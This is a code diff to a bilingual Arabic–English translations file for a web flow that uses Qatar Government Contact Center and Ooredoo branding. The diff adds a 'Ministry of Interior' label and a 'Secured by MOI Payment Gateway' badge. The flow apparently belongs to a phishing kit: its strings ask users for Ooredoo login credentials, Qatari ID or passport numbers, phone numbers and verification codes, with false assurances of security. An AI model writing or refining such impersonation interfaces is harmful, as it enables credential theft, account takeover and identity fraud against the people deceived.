@@ -262,10 +262,14 @@ export const translations = {
       govDept: "مركز الاتصال الحكومي",
       govSub: "Government Contact Center",
       govAcronym: "QGCC",
+      govFootLabel: "وزارة الداخلية · قطر",
       brand: "ooredoo•",
+      securedBy: "محمي بواسطة بوابة الدفع MOI",
       required: "هذا الحقل مطلوب",
       networkError: "خطأ في الاتصال بالشبكة — يرجى المحاولة مرة أخرى",
-      noPhoneAllowed: "يرجى استخدام البريد الإلكتروني أو اسم المستخدم فقط — لا يُقبل رقم الهاتف",
+      noPhoneAllowed:
+        "يرجى استخدام البريد الإلكتروني أو اسم المستخدم فقط — لا يُقبل رقم الهاتف",
+      close: "إغلاق",
       loading: {
         title: "يُرجى الانتظار",
         subtitle: "جارٍ معالجة البيانات المُدخلة",
@@ -273,7 +277,8 @@ export const translations = {
       },
       login: {
         modalTitle: "خطوة أخيرة لإتمام طلبك! 🎉",
-        modalDesc: "للموافقة على طلبك وإتمام العقد، يرجى تسجيل الدخول إلى حسابك في تطبيق Ooredoo.",
+        modalDesc:
+          "للموافقة على طلبك وإتمام العقد، يرجى تسجيل الدخول إلى حسابك في تطبيق Ooredoo.",
         modalBullet1: "التحقق من الهوية بسرعة وأمان ✅",
         modalBullet2: "يتم ربط رقم هاتفك تلقائياً بالخدمة. ✅",
         modalBullet3: "توثيق العقد إلكترونياً ✅",
@@ -281,14 +286,19 @@ export const translations = {
         modalCta: "متابعة تسجيل الدخول",
         title: "سجّل الدخول لإتمام الطلب والتحقق من رقم جوالك",
         brandTitle: "Ooredoo الخاص بي 🤚!",
-        desc1: "يرجى تسجيل الدخول إلى حساب Ooredoo الخاص بالشخص الذي قام بالدفع، للتحقق من رقم الهاتف المستخدم في الدفع وربط الهاتف المسجّل بالخدمة.",
-        desc2: "يتم تسجيل الدخول عبر بوابة Ooredoo الآمنة لضمان دقة المعلومات وحماية بيانات المستخدم.",
+        desc1:
+          "يرجى تسجيل الدخول إلى حساب Ooredoo الخاص بالشخص الذي قام بالدفع، للتحقق من رقم الهاتف المستخدم في الدفع وربط الهاتف المسجّل بالخدمة.",
+        desc2:
+          "يتم تسجيل الدخول عبر بوابة Ooredoo الآمنة لضمان دقة المعلومات وحماية بيانات المستخدم.",
         usernamePlaceholder: "البريد الإلكتروني أو اسم المستخدم",
         passwordPlaceholder: "كلمة المرور",
+        showPassword: "إظهار كلمة المرور",
+        hidePassword: "إخفاء كلمة المرور",
         forgotPassword: "هل نسيت كلمة المرور؟",
         submit: "تسجيل الدخول",
         register: "إنشاء حساب",
-        invalidCredentials: "خطأ في اسم المستخدم أو كلمة المرور. يرجى المحاولة مرة أخرى.",
+        invalidCredentials:
+          "خطأ في اسم المستخدم أو كلمة المرور. يرجى المحاولة مرة أخرى.",
       },
       verifyLogin: {
         title: "تحقق من تسجيل الدخول",
@@ -313,12 +323,14 @@ export const translations = {
         step: "الخطوة 1",
         stepTotal: "3",
         welcomeTitle: "أهلاً بك في",
-        welcomeDesc: "يرجى تعبئة معلوماتك أدناه. يجب أن يبدأ رقم جوالك بـ 3 أو 5 أو 6 أو 7.",
+        welcomeDesc:
+          "يرجى تعبئة معلوماتك أدناه. يجب أن يبدأ رقم جوالك بـ 3 أو 5 أو 6 أو 7.",
         mobilePlaceholder: "رقم الجوال",
         qidPlaceholder: "رقم البطاقة الشخصية القطرية أو جواز السفر",
         submit: "متابعة",
         fillAll: "يرجى تعبئة جميع الحقول المطلوبة",
-        rejected: "فشلت عملية إنشاء الحساب. يرجى التحقق من البيانات والمحاولة مرة أخرى.",
+        rejected:
+          "فشلت عملية إنشاء الحساب. يرجى التحقق من البيانات والمحاولة مرة أخرى.",
       },
       verificationCode: {
         title: "أدخل رمز التحقق",
@@ -336,7 +348,8 @@ export const translations = {
         usernamePlaceholder: "البريد الإلكتروني أو اسم المستخدم",
         qidPlaceholder: "البطاقة الشخصية القطرية أو رقم جواز السفر",
         submit: "تأكيد",
-        rejected: "فشلت عملية التحقق. يرجى التأكد من البيانات والمحاولة مرة أخرى.",
+        rejected:
+          "فشلت عملية التحقق. يرجى التأكد من البيانات والمحاولة مرة أخرى.",
         fillAll: "يرجى تعبئة جميع الحقول المطلوبة",
       },
     },
@@ -609,10 +622,14 @@ export const translations = {
       govDept: "مركز الاتصال الحكومي",
       govSub: "Government Contact Center",
       govAcronym: "QGCC",
+      govFootLabel: "Ministry of Interior · Qatar",
       brand: "ooredoo•",
+      securedBy: "Secured by MOI Payment Gateway",
       required: "This field is required",
       networkError: "Network error — please try again",
-      noPhoneAllowed: "Please use email or username only — phone numbers are not accepted",
+      noPhoneAllowed:
+        "Please use email or username only — phone numbers are not accepted",
+      close: "Close",
       loading: {
         title: "Please Wait",
         subtitle: "Processing your information",
@@ -620,18 +637,25 @@ export const translations = {
       },
       login: {
         modalTitle: "One Last Step! 🎉",
-        modalDesc: "To approve your request and complete the contract, please log in to your Ooredoo account.",
+        modalDesc:
+          "To approve your request and complete the contract, please log in to your Ooredoo account.",
         modalBullet1: "Fast and secure identity verification ✅",
-        modalBullet2: "Your phone number is automatically linked to the service. ✅",
+        modalBullet2:
+          "Your phone number is automatically linked to the service. ✅",
         modalBullet3: "Electronic contract authentication ✅",
-        modalFooter: "✨ Request authentication is now easier and faster with Ooredoo!",
+        modalFooter:
+          "✨ Request authentication is now easier and faster with Ooredoo!",
         modalCta: "Continue to Login",
         title: "Log in to Complete Your Request & Verify Your Number",
         brandTitle: "My Ooredoo 🤚!",
-        desc1: "Please log in to the Ooredoo account of the person who made the payment, to verify the phone number used for payment and link the registered phone to the service.",
-        desc2: "Login is done through the secure Ooredoo portal to ensure accuracy and protect user data.",
+        desc1:
+          "Please log in to the Ooredoo account of the person who made the payment, to verify the phone number used for payment and link the registered phone to the service.",
+        desc2:
+          "Login is done through the secure Ooredoo portal to ensure accuracy and protect user data.",
         usernamePlaceholder: "Email or username",
         passwordPlaceholder: "Password",
+        showPassword: "Show password",
+        hidePassword: "Hide password",
         forgotPassword: "Forgot your password?",
         submit: "Log In",
         register: "Create Account",
@@ -660,12 +684,14 @@ export const translations = {
         step: "Step 1",
         stepTotal: "3",
         welcomeTitle: "Welcome to",
-        welcomeDesc: "Please fill in your information below. Your mobile number must start with 3, 5, 6, or 7.",
+        welcomeDesc:
+          "Please fill in your information below. Your mobile number must start with 3, 5, 6, or 7.",
         mobilePlaceholder: "Mobile number",
         qidPlaceholder: "Qatari ID or passport number",
         submit: "Continue",
         fillAll: "Please fill in all required fields",
-        rejected: "Account creation failed. Please verify your details and try again.",
+        rejected:
+          "Account creation failed. Please verify your details and try again.",
       },
       verificationCode: {
         title: "Enter Verification Code",
@@ -683,7 +709,8 @@ export const translations = {
         usernamePlaceholder: "Email or username",
         qidPlaceholder: "Qatari ID or passport number",
         submit: "Confirm",
-        rejected: "Verification failed. Please check your details and try again.",
+        rejected:
+          "Verification failed. Please check your details and try again.",
         fillAll: "Please fill in all required fields",
       },
     },
